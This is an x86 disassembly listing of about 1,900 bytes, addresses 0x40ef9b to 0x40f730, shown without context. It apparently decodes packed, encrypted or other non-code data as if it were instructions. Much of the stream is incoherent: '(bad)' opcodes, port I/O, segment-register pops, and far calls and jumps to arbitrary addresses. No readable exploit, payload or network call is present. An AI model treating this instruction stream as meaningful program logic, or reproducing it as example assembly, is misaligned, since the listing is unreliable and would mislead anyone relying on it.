  40ef9b:	mov    dh,0xcd
  40ef9d:	mov    ds:0xa07986e5,al
  40efa2:	inc    ebx
  40efa3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40efa4:	lods   al,BYTE PTR ds:[esi]
  40efa5:	scas   al,BYTE PTR es:[edi]
  40efa6:	aam    0x1b
  40efa8:	or     al,0xf7
  40efaa:	fmul   QWORD PTR [edx-0x39f53194]
  40efb0:	add    eax,0x8612d45e
  40efb5:	push   ecx
  40efb6:	push   es
  40efb7:	fdiv   st(0),st
  40efb9:	sbb    al,0x84
  40efbb:	mov    al,0x7e
  40efbd:	mov    ?,WORD PTR [esi-0x5c13c04b]
  40efc3:	imul   esp,ebp,0xffffffa9
  40efc6:	sbb    DWORD PTR es:[edi-0x5556fd9],esp
  40efcd:	icebp  
  40efce:	jmp    0x40f04c
  40efd0:	xchg   ebp,eax
  40efd1:	xchg   edi,eax
  40efd2:	shr    DWORD PTR [edi+0xf57ede5],0x72
  40efd9:	and    DWORD PTR [ecx],esi
  40efdb:	es (bad) 
  40efdd:	and    DWORD PTR [esi],ebp
  40efdf:	sub    eax,eax
  40efe1:	pushf  
  40efe2:	push   edx
  40efe3:	mov    edx,0xa96ea45a
  40efe8:	add    bl,BYTE PTR [ebx-0x527caf34]
  40efee:	es jnp 0x40efb8
  40eff1:	mov    ebp,0xd22ee527
  40eff6:	xchg   ecx,eax
  40eff7:	in     eax,dx
  40eff8:	jle    0x40f03c
  40effa:	xlat   BYTE PTR ds:[ebx]
  40effb:	mov    al,ds:0x8e7f2e15
  40f000:	adc    ah,dh
  40f002:	cli    
  40f003:	lahf   
  40f004:	xor    al,BYTE PTR [esi]
  40f006:	mov    ebp,0x4e3648d0
  40f00b:	nop
  40f00c:	xor    cl,BYTE PTR [edx]
  40f00e:	push   esp
  40f00f:	xlat   BYTE PTR ds:[ebx]
  40f010:	push   edi
  40f011:	jp     0x40f091
  40f013:	cwde   
  40f014:	aas    
  40f015:	add    DWORD PTR [ecx+0x1367bcef],esp
  40f01b:	popf   
  40f01c:	(bad)  
  40f01d:	add    edx,eax
  40f01f:	adc    DWORD PTR [ebx+0x768b784],esi
  40f025:	jno    0x40f060
  40f027:	pop    es
  40f028:	sbb    eax,esp
  40f02a:	inc    eax
  40f02b:	aad    0xa5
  40f02d:	int    0x21
  40f02f:	lds    esi,FWORD PTR [ecx-0x41]
  40f032:	iret   
  40f033:	or     ecx,DWORD PTR es:[ecx]
  40f036:	pop    ss
  40f037:	or     eax,0xa19a60e1
  40f03c:	jmp    0x28a60209
  40f041:	xor    edi,esp
  40f043:	jp     0x40f023
  40f045:	outs   dx,BYTE PTR ds:[esi]
  40f046:	sub    ah,BYTE PTR [eax+0x6c]
  40f049:	ret    0x7fa
  40f04c:	push   eax
  40f04d:	push   edx
  40f04e:	dec    edx
  40f04f:	dec    ecx
  40f050:	por    mm6,QWORD PTR [ebx+0x1]
  40f054:	and    edi,DWORD PTR [ecx]
  40f056:	mov    bh,0x65
  40f058:	(bad)  
  40f059:	mov    bl,0x59
  40f05b:	pushf  
  40f05c:	jno    0x40f0d7
  40f05e:	fxrstor [edx*1+0x148f55bf]
  40f066:	mov    esi,0xdace95e3
  40f06b:	sub    dl,BYTE PTR [ebx+0x1317b699]
  40f071:	add    DWORD PTR [edi+0x54],esi
  40f074:	ja     0x40f0f0
  40f076:	test   al,0x25
  40f078:	out    dx,al
  40f079:	clc    
  40f07a:	add    BYTE PTR [ebp+0x6744a304],ch
  40f080:	push   esp
  40f081:	add    ch,BYTE PTR [edx]
  40f083:	adc    dl,BYTE PTR [esi+0x5f390f28]
  40f089:	mov    ds:0xb916aa66,eax
  40f08e:	jae    0x40f0f2
  40f090:	mov    al,0xf3
  40f092:	neg    DWORD PTR [ecx-0x21636c67]
  40f098:	xchg   edi,eax
  40f099:	inc    edx
  40f09b:	xlat   BYTE PTR ds:[ebx]
  40f09c:	lods   al,BYTE PTR ds:[esi]
  40f09d:	mul    BYTE PTR [edi-0x7e]
  40f0a0:	adc    ah,BYTE PTR [ecx]
  40f0a2:	jle    0x40f0ae
  40f0a4:	adc    DWORD PTR [eax],edi
  40f0a6:	mov    eax,0x3ef839b
  40f0ab:	adc    BYTE PTR [edi-0x740b5035],ch
  40f0b1:	pop    edx
  40f0b2:	xor    eax,0xa094000b
  40f0b7:	aas    
  40f0b8:	xchg   esi,eax
  40f0b9:	loop   0x40f11b
  40f0bb:	dec    edx
  40f0bc:	imul   edi,DWORD PTR [edi+esi*2],0xab7e0bde
  40f0c3:	push   ds
  40f0c4:	and    DWORD PTR [eax-0x5752eb05],ebp
  40f0ca:	and    DWORD PTR [ecx+0x29c351ef],ebx
  40f0d0:	std    
  40f0d1:	icebp  
  40f0d2:	shr    ch,1
  40f0d4:	js     0x40f05b
  40f0d6:	mov    esp,0xd44d793d
  40f0db:	cwde   
  40f0dc:	pop    ebx
  40f0dd:	pop    ss
  40f0de:	sub    BYTE PTR [ebx+0x66],cl
  40f0e1:	inc    edx
  40f0e2:	lods   al,BYTE PTR ds:[si]
  40f0e4:	fisttp DWORD PTR [eax]
  40f0e6:	xchg   DWORD PTR [ebx+0x52],esi
  40f0e9:	xor    DWORD PTR [esi+0x6ed8953c],ebp
  40f0ef:	add    DWORD PTR [eax-0x2cf24f8c],ecx
  40f0f5:	sbb    ebp,DWORD PTR [ebp-0x10]
  40f0f8:	das    
  40f0f9:	xor    DWORD PTR [esi-0x30],eax
  40f0fc:	(bad)  
  40f0fe:	sub    al,0xe5
  40f100:	lods   al,BYTE PTR ds:[esi]
  40f101:	cs in  eax,0x21
  40f104:	mov    ebx,0x34f043d3
  40f109:	loope  0x40f09a
  40f10b:	sub    ch,BYTE PTR [ebx]
  40f10d:	inc    ebp
  40f10e:	fimul  WORD PTR ss:[esi]
  40f111:	test   DWORD PTR [ecx],ebp
  40f113:	adc    BYTE PTR [ecx+ebx*2],dl
  40f116:	mov    ecx,0xe10f14aa
  40f11b:	inc    ebp
  40f11c:	cmp    BYTE PTR gs:[esi+0x73],0xbb
  40f121:	mov    WORD PTR [ecx+0x13277b48],fs
  40f127:	js     0x40f17d
  40f129:	jg     0x40f0c5
  40f12b:	in     al,0x9e
  40f12d:	dec    esp
  40f12e:	jno    0x40f0b4
  40f130:	cmp    dl,BYTE PTR [esi-0x62]
  40f133:	or     al,dh
  40f135:	pop    edi
  40f136:	mov    ebp,0x791662db
  40f13b:	adc    cl,BYTE PTR [esi+0x72]
  40f13e:	mov    edi,0xca93ab04
  40f143:	sar    DWORD PTR [edi+0x2e],1
  40f146:	mov    al,0xd4
  40f148:	ret    0x6485
  40f14b:	inc    esi
  40f14c:	and    al,0xc0
  40f14e:	call   0x8cd9:0xceedeed2
  40f155:	mov    esi,0xf1a42a5f
  40f15a:	retf   0x4a0c
  40f15d:	adc    esi,DWORD PTR [esi-0x62]
  40f160:	aaa    
  40f161:	aam    0x0
  40f163:	push   ds
  40f164:	mov    bl,0xaf
  40f166:	or     eax,0x72a79dc5
  40f16b:	bound  esi,QWORD PTR [eax+0x49]
  40f16e:	mov    ds:0xbb617b3c,eax
  40f173:	daa    
  40f174:	popf   
  40f175:	xorps  xmm5,XMMWORD PTR ds:0xde429701
  40f17c:	lds    ebx,FWORD PTR [ecx+0x11af6247]
  40f182:	cli    
  40f183:	pop    ecx
  40f184:	ds sub eax,0x75ff9475
  40f18a:	xchg   esp,eax
  40f18b:	jg     0x40f11e
  40f18d:	xchg   BYTE PTR [edi+0xb],dh
  40f190:	cdq    
  40f191:	jmp    0x40f18a
  40f193:	xchg   edi,eax
  40f194:	sub    BYTE PTR [eax+ebx*2-0x50],bl
  40f198:	pop    ecx
  40f199:	adc    DWORD PTR [ecx-0x31a67cb3],0x18
  40f1a0:	and    ebx,edi
  40f1a2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f1a3:	aas    
  40f1a4:	sti    
  40f1a5:	shr    ebp,1
  40f1a7:	mov    eax,ds:0x2fdb1be7
  40f1ac:	std    
  40f1ad:	fist   WORD PTR [esi+0x1e]
  40f1b0:	dec    edx
  40f1b1:	push   0x28
  40f1b3:	test   DWORD PTR [ebx+0x40],0x8a7d2669
  40f1ba:	sub    al,0x3c
  40f1bc:	xchg   DWORD PTR [esi+eax*2-0x17e6e376],ebx
  40f1c3:	pop    ebx
  40f1c4:	xor    eax,0xfb91ca0f
  40f1c9:	lock xor eax,0x17bcb614
  40f1cf:	aam    0xba
  40f1d1:	pop    ds
  40f1d2:	mov    bh,0xde
  40f1d4:	dec    ebx
  40f1d5:	gs inc edi
  40f1d7:	test   al,dh
  40f1d9:	dec    edi
  40f1da:	jne    0x40f1e2
  40f1dc:	fs pop edi
  40f1de:	dec    edx
  40f1df:	test   al,0x93
  40f1e1:	pop    edx
  40f1e2:	dec    ebp
  40f1e3:	pop    edx
  40f1e4:	out    0xc1,al
  40f1e6:	scas   al,BYTE PTR es:[edi]
  40f1e7:	or     BYTE PTR [ebp-0x14],dh
  40f1ea:	ret    0xe145
  40f1ed:	rcr    BYTE PTR [ebp-0x74ffa8d9],0x44
  40f1f4:	(bad)  
  40f1f5:	(bad)  
  40f1f7:	(bad)  [esi]
  40f1f9:	dec    esi
  40f1fa:	dec    ebp
  40f1fb:	ins    DWORD PTR es:[edi],dx
  40f1fc:	(bad)  
  40f1fd:	ins    BYTE PTR es:[edi],dx
  40f1fe:	mov    eax,0x3a5fe74f
  40f203:	push   ebx
  40f204:	retf   
  40f205:	mov    dh,bh
  40f207:	scas   al,BYTE PTR es:[edi]
  40f208:	cs dec edx
  40f20a:	sub    al,0x9d
  40f20c:	sub    dl,BYTE PTR [edi-0x26b66cd1]
  40f212:	sub    al,0xa7
  40f214:	in     eax,dx
  40f215:	pushf  
  40f216:	mov    dh,0x1a
  40f218:	sub    eax,0x41a84a21
  40f21d:	popa   
  40f21e:	push   cs
  40f21f:	inc    edi
  40f220:	test   DWORD PTR [esi],ebp
  40f222:	dec    edi
  40f223:	lds    esp,FWORD PTR [esi-0x60]
  40f226:	loope  0x40f209
  40f228:	push   ds
  40f229:	mov    ch,0xbc
  40f22b:	call   0xde71:0xa4039bd0
  40f232:	cmp    eax,0x1b4e8a36
  40f237:	mov    ah,0x9a
  40f239:	mov    ds:0x168eaa1e,al
  40f23e:	cmp    BYTE PTR [esi],al
  40f240:	sbb    al,0x8c
  40f242:	jbe    0x40f20b
  40f244:	inc    esi
  40f245:	in     al,dx
  40f246:	jae    0x40f1fa
  40f248:	inc    esp
  40f249:	repnz inc ecx
  40f24b:	pop    es
  40f24c:	(bad)  
  40f24d:	pop    ebp
  40f24e:	adc    BYTE PTR [eax],dl
  40f250:	push   esi
  40f251:	cmp    BYTE PTR [edx+0x5e],dh
  40f254:	push   ecx
  40f255:	fmul   QWORD PTR [ecx-0x2f2bf0fd]
  40f25b:	or     BYTE PTR [ecx-0x1e],dl
  40f25e:	adc    BYTE PTR [ecx-0x80],ch
  40f261:	fnsave [ebx-0x33]
  40f264:	adc    al,0x9c
  40f266:	mov    bh,0xd1
  40f268:	sbb    BYTE PTR [ecx-0x7b],dh
  40f26b:	dec    eax
  40f26c:	pop    ss
  40f26d:	fild   WORD PTR [esi-0x26d39f98]
  40f273:	jp     0xdc13aa0e
  40f279:	push   edi
  40f27a:	mov    eax,0xd8e34e01
  40f27f:	xor    edi,DWORD PTR [edi]
  40f281:	push   eax
  40f282:	inc    ebp
  40f283:	daa    
  40f284:	(bad)  
  40f285:	retf   
  40f286:	inc    edx
  40f287:	jecxz  0x40f2d0
  40f289:	or     BYTE PTR [esi],ah
  40f28b:	fsub   QWORD PTR [ecx+0x3]
  40f28e:	dec    edx
  40f28f:	out    0xf5,al
  40f291:	jns    0x40f2bc
  40f293:	es scas eax,DWORD PTR es:[edi]
  40f295:	addr16 loope 0x40f282
  40f298:	ror    ch,cl
  40f29a:	mov    ah,0x63
  40f29c:	(bad)  
  40f29d:	sbb    al,0x7a
  40f29f:	xor    al,0x13
  40f2a1:	xor    bl,BYTE PTR [eax+esi*4]
  40f2a4:	pop    edi
  40f2a5:	jne    0x40f22e
  40f2a7:	xor    dh,BYTE PTR [eax]
  40f2a9:	inc    ecx
  40f2aa:	pusha  
  40f2ab:	lahf   
  40f2ac:	outs   dx,BYTE PTR ds:[esi]
  40f2ad:	cmp    esp,DWORD PTR [eax-0x61e7f42b]
  40f2b3:	(bad)  
  40f2b4:	mov    cs,edx
  40f2b6:	pushf  
  40f2b7:	or     eax,0xc782c1db
  40f2bc:	cwde   
  40f2bd:	inc    ebp
  40f2be:	dec    ebp
  40f2bf:	cmp    DWORD PTR [ebx-0xc4f2cb0],esi
  40f2c5:	add    eax,edx
  40f2c7:	in     al,dx
  40f2c8:	push   0x697f600
  40f2cd:	pop    ecx
  40f2ce:	mov    ecx,0xf0e9826
  40f2d3:	xor    bh,BYTE PTR [edi+0x30b4e04d]
  40f2d9:	sbb    DWORD PTR [edi+0x11],0x20bcef32
  40f2e0:	sti    
  40f2e1:	mov    edi,0xfa29485a
  40f2e6:	mov    ecx,0x55c2b81c
  40f2eb:	mov    ecx,0x45c4ea1d
  40f2f0:	repz in al,0x2a
  40f2f3:	leave  
  40f2f4:	sub    al,0x13
  40f2f6:	outs   dx,BYTE PTR ds:[si]
  40f2f8:	cld    
  40f2f9:	jno    0x40f370
  40f2fb:	mov    BYTE PTR [ebp*8-0x70501658],dh
  40f302:	outs   dx,DWORD PTR ds:[esi]
  40f303:	mov    ebp,DWORD PTR [ebp-0x22]
  40f306:	(bad)  
  40f307:	sbb    eax,0x98ca83e3
  40f30c:	dec    eax
  40f30d:	pop    eax
  40f30e:	lea    edi,[ecx]
  40f310:	dec    eax
  40f311:	and    BYTE PTR [esi-0x2b],0xc5
  40f315:	adc    eax,0x3619aa83
  40f31a:	rcl    ecx,1
  40f31c:	repnz inc edi
  40f31e:	push   ebp
  40f31f:	adc    al,0x24
  40f321:	sub    BYTE PTR [edi+ebx*4],dh
  40f324:	mov    ax,ds:0xd0177179
  40f32a:	jmp    0x4e72d40d
  40f32f:	ins    DWORD PTR es:[edi],dx
  40f330:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f331:	xor    eax,0x7cca8ea5
  40f336:	dec    edi
  40f337:	dec    ebx
  40f338:	mov    dl,0xe2
  40f33a:	inc    ebx
  40f33b:	pusha  
  40f33c:	cmp    al,0xa7
  40f33e:	data16 ins BYTE PTR es:[edi],dx
  40f340:	xchg   BYTE PTR ds:[eax+0x72e387af],dl
  40f347:	and    eax,0xd6f88b7e
  40f34c:	adc    bl,BYTE PTR [eax]
  40f34e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f34f:	scas   eax,DWORD PTR es:[edi]
  40f350:	fnsave [edx]
  40f352:	sar    ah,cl
  40f354:	mov    esi,0xba8bdb02
  40f359:	and    dl,BYTE PTR [ebp-0x28bbc271]
  40f35f:	jno    0x40f349
  40f361:	arpl   WORD PTR [eax],si
  40f363:	test   dl,dl
  40f365:	test   ah,cl
  40f367:	cmp    ecx,esi
  40f369:	mov    ecx,ebp
  40f36b:	push   0xfffffffe
  40f36d:	mov    cl,0x71
  40f36f:	fcom   QWORD PTR [esi]
  40f371:	retf   
  40f372:	cmp    ebp,DWORD PTR [edx-0x43]
  40f375:	out    dx,eax
  40f376:	xchg   DWORD PTR [ebx-0x6089433],eax
  40f37c:	sbb    edi,ecx
  40f37e:	fs sti 
  40f380:	xchg   esi,eax
  40f381:	pop    ss
  40f382:	loope  0x40f3e7
  40f384:	loop   0x40f3fe
  40f386:	pop    edx
  40f387:	bswap  edx
  40f389:	jne    0x40f404
  40f38b:	add    BYTE PTR [ebp-0x19],ah
  40f38e:	int    0xa1
  40f390:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f391:	clc    
  40f392:	dec    ecx
  40f393:	adc    DWORD PTR [ecx+eiz*4],eax
  40f396:	sahf   
  40f397:	(bad)  
  40f399:	rol    BYTE PTR [ecx-0x50ad44c1],0xe3
  40f3a0:	cmp    al,0x4d
  40f3a2:	(bad)  
  40f3a4:	mov    al,0xa3
  40f3a6:	shl    DWORD PTR [eax-0x1d652cee],1
  40f3ac:	jmp    0x872d:0xb65908db
  40f3b3:	and    DWORD PTR [ecx],esi
  40f3b5:	cmp    ebx,DWORD PTR [eax]
  40f3b7:	aad    0x30
  40f3b9:	jbe    0x40f3dc
  40f3bb:	xor    BYTE PTR [esi],al
  40f3bd:	call   0xfec69a0d
  40f3c2:	or     al,0x7
  40f3c4:	xchg   edx,eax
  40f3c5:	sbb    eax,0x67fd32a4
  40f3ca:	cmp    al,0x63
  40f3cc:	sbb    cl,BYTE PTR [esi+0x60]
  40f3cf:	xor    ebp,DWORD PTR [eax+0x71]
  40f3d2:	mov    edi,0x129abd9f
  40f3d7:	push   esi
  40f3d8:	loope  0x40f43a
  40f3da:	and    eax,0xec2b70fa
  40f3df:	mov    edx,0xf5177c6d
  40f3e4:	stos   BYTE PTR es:[edi],al
  40f3e5:	jp     0x40f40f
  40f3e7:	nop
  40f3e8:	or     ch,0xed
  40f3eb:	xchg   edi,eax
  40f3ec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f3ed:	es (bad) 
  40f3ef:	mov    dh,0xd2
  40f3f1:	sub    eax,DWORD PTR [ebx-0x4d]
  40f3f4:	stos   BYTE PTR es:[edi],al
  40f3f5:	xor    bl,BYTE PTR [edi+0x222b41b9]
  40f3fb:	and    al,0xae
  40f3fd:	stc    
  40f3fe:	jmp    0x40f458
  40f400:	clc    
  40f401:	or     edi,DWORD PTR [ebp-0x22]
  40f404:	fwait
  40f405:	xlat   BYTE PTR ds:[ebx]
  40f406:	xchg   BYTE PTR [ecx],dl
  40f408:	lock add BYTE PTR [edi+0xb],0x4e
  40f40d:	push   0xffffffa3
  40f40f:	arpl   WORD PTR [eax+0x59e7a7f3],cx
  40f415:	out    dx,eax
  40f416:	push   0xffffffb3
  40f418:	jo     0x40f3ce
  40f41a:	mov    ah,0xe2
  40f41c:	xor    al,0x78
  40f41e:	(bad)  
  40f41f:	ret    
  40f420:	sbb    DWORD PTR ds:0xda48b656,edx
  40f426:	ja     0x40f48c
  40f428:	sub    ah,BYTE PTR [esi+0x41]
  40f42b:	push   edx
  40f42c:	add    al,0x64
  40f42e:	sbb    BYTE PTR [eax],dl
  40f430:	push   ebx
  40f431:	shl    ch,0x23
  40f434:	pushf  
  40f435:	retf   
  40f436:	inc    edx
  40f437:	fwait
  40f438:	sub    bh,al
  40f43a:	sub    DWORD PTR [ebx],0xffffffe2
  40f43d:	jg     0x40f493
  40f43f:	frstor [ebx+0x5bae5018]
  40f445:	pop    ebx
  40f446:	xchg   edi,eax
  40f447:	loopne 0x40f3dc
  40f449:	pop    ss
  40f44a:	cdq    
  40f44b:	sbb    ecx,DWORD PTR [ebp+0x16]
  40f44e:	dec    ebx
  40f44f:	and    BYTE PTR [esi-0x61],dh
  40f452:	mov    ds:0x3070a877,al
  40f457:	call   0x983e:0xa7aeca01
  40f45e:	pop    esp
  40f45f:	push   ebx
  40f460:	add    BYTE PTR ds:0x819e91b5,bl
  40f466:	jns    0x40f4b9
  40f468:	sub    eax,0x23d15167
  40f46d:	icebp  
  40f46e:	xchg   esi,eax
  40f46f:	cld    
  40f470:	dec    eax
  40f471:	pop    ds
  40f472:	in     eax,0xb1
  40f474:	cwde   
  40f475:	aam    0x23
  40f477:	sbb    al,0x63
  40f479:	pop    eax
  40f47a:	adc    DWORD PTR [ecx+0x2840248d],0xffffff8a
  40f481:	repnz mov esi,0xe9b735cd
  40f487:	pminsw mm6,mm6
  40f48a:	sbb    ebx,edx
  40f48c:	mov    dh,0x71
  40f48e:	lock mov al,0xfa
  40f491:	(bad)  
  40f492:	lds    ecx,FWORD PTR [eax+0x8279ffd]
  40f498:	mov    dl,0x22
  40f49a:	dec    esi
  40f49b:	cmp    al,0xf5
  40f49d:	test   bh,bl
  40f49f:	dec    esp
  40f4a0:	jmp    0xd30ca89f
  40f4a5:	inc    edi
  40f4a6:	pop    ds
  40f4a7:	jbe    0x40f460
  40f4a9:	add    al,BYTE PTR [ecx+0x6e1db07f]
  40f4af:	sub    esp,ebp
  40f4b1:	dec    esi
  40f4b2:	and    BYTE PTR [ecx],cl
  40f4b4:	in     eax,0x75
  40f4b6:	ds jmp 0x40f442
  40f4b9:	call   0x73f5:0xc35efcbc
  40f4c0:	mov    eax,ds:0xf3f07196
  40f4c5:	cmp    DWORD PTR [edi+0x61],0xffffffb2
  40f4c9:	fld    QWORD PTR [ebx+0x6e40d013]
  40f4cf:	int3   
  40f4d0:	fisttp QWORD PTR fs:[eax-0x49]
  40f4d4:	out    0x45,eax
  40f4d6:	popf   
  40f4d7:	test   DWORD PTR [edx-0xd],0xd8ebaee7
  40f4de:	dec    eax
  40f4df:	mov    ah,0xbe
  40f4e1:	shr    BYTE PTR [esi+eax*8+0x47],cl
  40f4e5:	mov    ds:0xe02a2fe5,al
  40f4ea:	adc    esi,DWORD PTR [ecx]
  40f4ec:	pop    ss
  40f4ed:	inc    edx
  40f4ee:	xchg   ebx,eax
  40f4ef:	fcom   DWORD PTR [ebx+0x45]
  40f4f2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f4f3:	add    dh,BYTE PTR ds:0xdf150bff
  40f4f9:	outs   dx,DWORD PTR ds:[esi]
  40f4fa:	pop    esp
  40f4fb:	nop
  40f4fc:	popf   
  40f4fd:	fisttp QWORD PTR [edx+ebp*4-0x6b]
  40f501:	xchg   ebp,eax
  40f502:	outs   dx,BYTE PTR ds:[esi]
  40f503:	lds    esi,FWORD PTR [edx-0x2]
  40f506:	and    ebx,DWORD PTR [eax]
  40f508:	ficom  DWORD PTR [eax+0x2dbd565d]
  40f50e:	rcr    al,0x7c
  40f511:	cld    
  40f512:	(bad)  
  40f513:	aam    0xbb
  40f515:	xchg   edi,eax
  40f516:	or     al,0x38
  40f518:	add    BYTE PTR [eax+esi*4],0x78
  40f51c:	popf   
  40f51d:	loopne 0x40f4d5
  40f51f:	ss add al,0xcc
  40f522:	pop    ds
  40f523:	jne    0x40f531
  40f525:	enter  0x7fe,0xd3
  40f529:	push   es
  40f52a:	pop    eax
  40f52b:	ret    0x293e
  40f52e:	xchg   ecx,eax
  40f52f:	into   
  40f530:	je     0x40f4db
  40f532:	and    eax,0x39b7c4ee
  40f537:	sub    eax,eax
  40f539:	xor    BYTE PTR ds:0xa827f643,0xca
  40f540:	das    
  40f541:	xchg   esp,eax
  40f542:	jnp    0x40f567
  40f544:	adc    DWORD PTR [edi-0x6bf0e0f7],ebp
  40f54a:	dec    eax
  40f54b:	pop    esi
  40f54c:	pop    es
  40f54d:	jmp    0x40f598
  40f54f:	sbb    al,0xfe
  40f551:	pop    esp
  40f552:	dec    ecx
  40f553:	fiadd  WORD PTR [ebp+edi*4+0x5b]
  40f557:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f558:	sbb    DWORD PTR [esi-0x77],ebp
  40f55b:	mov    eax,ds:0xa3017f2e
  40f560:	ja     0x40f5ab
  40f562:	add    eax,0x4f6dc427
  40f567:	fs iret 
  40f569:	mov    bh,0x71
  40f56b:	into   
  40f56c:	sbb    al,0x13
  40f56e:	jg     0x40f5ba
  40f570:	cmp    eax,0xe8c80235
  40f575:	pop    ss
  40f576:	mov    ch,0x9a
  40f578:	mov    ebp,0x63685210
  40f57d:	cli    
  40f57e:	xor    eax,0x409cb04d
  40f583:	and    BYTE PTR ss:[eax-0x1c038883],dl
  40f58a:	add    eax,0x37e882e7
  40f58f:	cmp    BYTE PTR [ebx],0xd1
  40f592:	retw   0xf5d6
  40f596:	mov    eax,0xaefa4f8d
  40f59b:	pop    edi
  40f59c:	es jne 0x40f592
  40f59f:	in     eax,dx
  40f5a0:	xchg   ecx,eax
  40f5a1:	xor    BYTE PTR [edi-0x45],ch
  40f5a4:	rcr    BYTE PTR [edx+0x3f],0x2f
  40f5a8:	es sub al,0xf4
  40f5ab:	adc    BYTE PTR es:[esp+eiz*4-0x58501c6f],bh
  40f5b3:	clc    
  40f5b4:	fmul   DWORD PTR ds:0x3d3069ee
  40f5ba:	shr    BYTE PTR [esi-0x68d30234],1
  40f5c0:	jmp    0x28f1:0xdc4b103d
  40f5c7:	aaa    
  40f5c8:	je     0x40f569
  40f5ca:	and    DWORD PTR ds:0x540f8563,ebp
  40f5d0:	push   edi
  40f5d1:	std    
  40f5d2:	xlat   BYTE PTR ds:[ebx]
  40f5d3:	and    edi,DWORD PTR [eax+0x3b]
  40f5d6:	adc    bh,al
  40f5d8:	mov    edx,0x577af91e
  40f5dd:	mov    esi,0xb2367f07
  40f5e2:	call   0x79f98a62
  40f5e7:	out    0x6c,eax
  40f5e9:	jne    0x40f5fd
  40f5eb:	inc    eax
  40f5ec:	sub    ebx,ebx
  40f5ee:	call   0xf4c39c1
  40f5f3:	jb     0x40f5a5
  40f5f5:	shr    edi,cl
  40f5f7:	xchg   esi,eax
  40f5f8:	nop
  40f5f9:	imul   esi,DWORD PTR [esi+edx*2+0xc],0x3a4d044c
  40f601:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f602:	fs push ecx
  40f604:	leave  
  40f605:	mov    WORD PTR ds:0xd944db0d,cs
  40f60b:	enter  0x9c41,0xce
  40f60f:	loope  0x40f5d0
  40f611:	push   esp
  40f612:	in     eax,0xf1
  40f614:	mov    eax,ds:0xdfada331
  40f619:	inc    edx
  40f61a:	mov    al,ds:0xe691b335
  40f61f:	scas   al,BYTE PTR es:[edi]
  40f620:	mov    bh,0x66
  40f622:	pop    esp
  40f623:	dec    edi
  40f624:	out    0x6,eax
  40f626:	push   eax
  40f627:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f628:	fbstp  TBYTE PTR [ecx-0x3d43fab4]
  40f62e:	mov    ah,0x50
  40f630:	xchg   edx,eax
  40f631:	mov    ds:0x4e15d63b,eax
  40f636:	jmp    0x403ef743
  40f63b:	add    al,0x7
  40f63d:	add    bl,BYTE PTR [ebx+0x73]
  40f640:	shl    esi,1
  40f642:	test   DWORD PTR ds:0xa24537db,0xaa091807
  40f64c:	jns    0x40f650
  40f64e:	les    ebp,FWORD PTR [eax]
  40f650:	xlat   BYTE PTR ds:[ebx]
  40f651:	arpl   WORD PTR ds:0x8ce38d36,cx
  40f657:	fmul   DWORD PTR [edi+ebp*8+0x6f0794f5]
  40f65e:	mov    esi,0xe96eb6bb
  40f663:	sub    eax,0xf19f3d96
  40f668:	jmp    0x3adae98e
  40f66d:	cmc    
  40f66e:	add    esi,esi
  40f670:	xor    ebx,DWORD PTR [ecx+0x17]
  40f673:	cwde   
  40f674:	retf   0x7aba
  40f677:	xor    DWORD PTR [ebp+0x24a09fe],edi
  40f67d:	ror    DWORD PTR [edx+edx*8],0x13
  40f681:	xchg   ebx,eax
  40f682:	cli    
  40f683:	mov    DWORD PTR [ebp+eiz*8+0x3dfe0650],ebp
  40f68a:	push   0x3f
  40f68c:	out    0xbb,eax
  40f68e:	repz jno 0x40f6c0
  40f691:	or     al,0x9f
  40f693:	loop   0x40f6a8
  40f695:	loopne 0x40f6a6
  40f697:	nop
  40f698:	dec    esp
  40f699:	xor    al,0x1e
  40f69b:	imul   BYTE PTR ds:0x590b7045
  40f6a1:	sub    edi,edi
  40f6a3:	pop    es
  40f6a4:	(bad)  
  40f6a6:	cmp    al,0x4
  40f6a8:	jb     0x40f70d
  40f6aa:	push   esp
  40f6ab:	adc    BYTE PTR ds:0xea99a5ab,0x27
  40f6b2:	xor    DWORD PTR [ecx+0x4c0e70da],ecx
  40f6b8:	leave  
  40f6b9:	enter  0xc47a,0x7b
  40f6bd:	add    al,0x93
  40f6bf:	ja     0x40f738
  40f6c1:	xchg   BYTE PTR [edx+0x7c9d3ef6],bl
  40f6c7:	in     eax,dx
  40f6c8:	xor    cl,BYTE PTR [esi+ebp*1+0x3c083170]
  40f6cf:	xchg   esi,eax
  40f6d0:	sbb    DWORD PTR [eax],edi
  40f6d2:	inc    esp
  40f6d3:	(bad)  
  40f6d4:	sub    BYTE PTR ds:0x511555d3,cl
  40f6da:	mov    al,0x99
  40f6dc:	or     eax,DWORD PTR ds:0x8b929de8
  40f6e2:	(bad)  
  40f6e3:	test   al,0x45
  40f6e5:	or     BYTE PTR [edi+0x7b],cl
  40f6e8:	cmc    
  40f6e9:	pop    ss
  40f6ea:	imul   esi,esi,0x59542ec2
  40f6f0:	jl     0x40f68e
  40f6f2:	ja     0x40f726
  40f6f4:	call   0x538800e0
  40f6f9:	inc    esp
  40f6fa:	lods   al,BYTE PTR ds:[esi]
  40f6fb:	dec    esp
  40f6fc:	lods   al,BYTE PTR ds:[esi]
  40f6fd:	and    DWORD PTR [edi+0x48],eax
  40f700:	int3   
  40f701:	daa    
  40f702:	push   edx
  40f703:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f704:	cmovge edx,DWORD PTR [ebx]
  40f707:	fcos   
  40f709:	pop    esi
  40f70a:	dec    ebx
  40f70b:	sbb    al,0x8d
  40f70d:	lods   eax,DWORD PTR ds:[esi]
  40f70e:	or     esp,DWORD PTR [eax+0x72]
  40f711:	ret    
  40f712:	pop    edi
  40f713:	mov    edx,0x596bd0ae
  40f718:	mov    ebx,0xd06546fb
  40f71d:	jae    0x40f6f7
  40f71f:	cmp    BYTE PTR [edi+0x75],dh
  40f722:	sub    cl,bl
  40f724:	test   esi,ecx
  40f726:	cmp    eax,0xec01be0c
  40f72b:	repz sbb DWORD PTR [ebx+0x75],ebx
  40f72f:	xchg   edi,eax
  40f730:	adc    DWORD PTR [ebx-0x9aaf638],0x79
